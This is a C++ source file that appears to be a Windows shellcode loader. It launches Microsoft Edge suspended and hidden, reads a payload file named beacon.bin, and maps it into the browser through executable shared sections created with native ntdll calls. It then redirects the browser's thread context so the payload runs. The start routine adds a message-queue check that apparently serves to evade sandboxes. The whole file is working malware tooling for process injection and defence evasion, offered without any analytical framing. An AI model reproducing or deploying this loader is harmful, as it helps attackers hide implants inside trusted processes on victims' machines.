#include <Windows.h>
#include <fstream>
#include <vector>

#include "Native.h"

std::vector<BYTE> read(const char path[])
{
    std::ifstream file(path, std::ios::binary);
    std::vector<BYTE> data(std::istreambuf_iterator<char>(file), {});
    file.close();

    return data;
}

void inject()
{
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info
    );

    std::vector<BYTE> shellcode = read("C:\\Windows\\beacon.bin");

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };
    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;
    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE
    );

    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    PVOID hRemoteAddress = NULL;
    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE
    );

    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    ResumeThread(process_info->hThread);

    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress
    );
}

void start()
{
    MSG msg;
    PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
    if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
        return;

    if (msg.message != WM_USER + 2 || msg.wParam != 23 || msg.lParam != 42)
        return;

    inject();
}
